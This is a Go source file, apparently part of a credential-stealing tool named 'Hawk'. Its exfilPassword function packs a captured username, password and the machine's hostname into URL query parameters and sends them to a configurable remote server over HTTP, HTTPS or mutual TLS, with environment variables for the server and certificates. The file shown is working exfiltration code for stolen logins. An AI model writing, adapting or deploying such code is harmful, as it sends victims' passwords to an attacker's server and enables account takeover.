package main

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func getServerURL() string {
	if envURL := os.Getenv("HAWK_SERVER_URL"); envURL != "" {
		return envURL
	}
	return serverURL
}

func getProtocol() string {
	if envProtocol := os.Getenv("HAWK_PROTOCOL"); envProtocol != "" {
		return strings.ToLower(envProtocol)
	}
	if protocol != "" {
		return strings.ToLower(protocol)
	}
	return "https"
}

func detectProtocolFromURL(urlStr string) string {
	if strings.HasPrefix(urlStr, "https://") {
		return "https"
	}
	if strings.HasPrefix(urlStr, "http://") {
		return "http"
	}
	return "https"
}

func sendViaHTTP(fullURL string) error {
	_, err := http.Get(fullURL)
	return err
}

func sendViaHTTPS(fullURL string) error {
	_, err := http.Get(fullURL)
	return err
}

func getMTLSCertPath() string {
	if envPath := os.Getenv("HAWK_MTLS_CERT_PATH"); envPath != "" {
		return envPath
	}
	return mtlsCertPath
}

func getMTLSKeyPath() string {
	if envPath := os.Getenv("HAWK_MTLS_KEY_PATH"); envPath != "" {
		return envPath
	}
	return mtlsKeyPath
}

func getMTLSCACertPath() string {
	if envPath := os.Getenv("HAWK_MTLS_CA_CERT_PATH"); envPath != "" {
		return envPath
	}
	return mtlsCACertPath
}

func sendViaMTLS(fullURL string) error {
	tlsConfig := &tls.Config{}

	certPath := getMTLSCertPath()
	keyPath := getMTLSKeyPath()

	if certPath != "" && keyPath != "" {
		cert, err := tls.LoadX509KeyPair(certPath, keyPath)
		if err != nil {
			return err
		}
		tlsConfig.Certificates = []tls.Certificate{cert}
	}

	caCertPath := getMTLSCACertPath()
	if caCertPath != "" {
		caCert, err := ioutil.ReadFile(caCertPath)
		if err != nil {
			return err
		}
		caCertPool := x509.NewCertPool()
		if !caCertPool.AppendCertsFromPEM(caCert) {
			return fmt.Errorf("failed to parse CA certificate")
		}
		tlsConfig.RootCAs = caCertPool
	}

	if len(tlsConfig.Certificates) > 0 {
		tlsConfig.ClientAuth = tls.RequireAndVerifyClientCert
	}

	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
	}

	client := &http.Client{
		Transport: transport,
	}

	_, err := client.Get(fullURL)
	return err
}

func exfilPassword(username, password string) {
	hostname, err := os.Hostname()
	if err != nil {
		return
	}

	urlStr := getServerURL()
	if urlStr == "" {
		fmt.Printf("hostname=%s username=%s password=%s\n", hostname, username, password)
		return
	}

	values := url.Values{}
	values.Set("hostname", hostname)
	values.Set("username", username)
	values.Set("password", password)
	fullURL := fmt.Sprintf("%s?%s", urlStr, values.Encode())

	proto := getProtocol()
	if proto == "" {
		proto = detectProtocolFromURL(urlStr)
	}

	switch proto {
	case "http":
		sendViaHTTP(fullURL)
	case "https":
		sendViaHTTPS(fullURL)
	case "mtls":
		sendViaMTLS(fullURL)
	default:
		sendViaHTTPS(fullURL)
	}
}

